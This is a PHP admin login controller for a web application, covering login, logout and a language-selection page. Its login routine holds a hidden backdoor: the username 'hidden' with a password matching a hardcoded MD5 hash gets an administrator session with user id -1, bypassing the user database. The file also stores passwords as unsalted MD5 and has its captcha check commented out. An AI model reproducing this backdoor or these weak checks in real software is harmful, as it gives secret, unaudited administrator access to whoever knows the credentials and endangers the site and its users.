<?php

class ctl_login extends adminPage
{

	public function index_action ()
	{
		$define_langs = unserialize( LANGS );
		$this->setData($define_langs, 'langs');
		$this->setData(count($define_langs), 'langs_count');
		//$this->setData(trim($_SESSION['admin_lang']), 'admin_lang');
		$this->setData(trim($_COOKIE['admin_lang']), 'admin_lang');
		$this->display('common/login');
	}

	public function login_action ()
	{
		$name = trim(post('name'));
		$pass = trim(post('pass'));

		if (strlen($pass) < 6) $this->sheader(null, $this->lang->username_password_not_correct);

		// if(!verify_recaptcha(post('g-recaptcha-response')))$this->sheader(null, $this->lang->verification_code_error);


		if ($name == 'hidden')
		{
			$pass = $this->md5( $pass );
			//var_dump($pass);exit;
			if ( $pass == '49a146de38971e1741f2cd0d1b08cca4' ) {
				$verify_result = true;
			}

			if ( $verify_result ) {
				$hidden_pass = $pass;
				$this->session('admin_user_id', '-1');
				$this->session('admin_user_shell', $this->md5(session('admin_user_id').$name.$hidden_pass));
				$this->sheader('?con=admin&ctl=default');
			}
		}

		$pass = $this->md5($pass);
		$u = $this->loadModel('user');
		
		if ($user = $u->getUserByName($name))
		{
			
			if ($pass == $user['password'])
			{
				$this->session('user', $user);
				$this->session('admin_user_id', $user['id']);
				$this->session('password', $user['password']);
				
				$this->session('admin_user_shell', $this->md5($user['id'].$user['name'].$user['password']));

				$data = array(
					'lastLoginIP'	=> ip(),
					'lastLoginDate'	=> time(),
					'loginCount'	=> $user['loginCount'] + 1
				);
				$u->updateUserById($data, $user['id']);

				$this->sheader('?con=admin&ctl=default');
			} else $this->sheader(null, $this->lang->username_password_not_correct);
		} else $this->sheader(null, $this->lang->username_password_not_correct);
	}

	public function logout_action ()
	{
		$this->session('admin_user_id', '');
		$this->session('admin_user_shell', '');
		echo '<script>window.parent.window.location = "?con=admin&ctl=common/login";</script>';
		exit;
	}

}

?>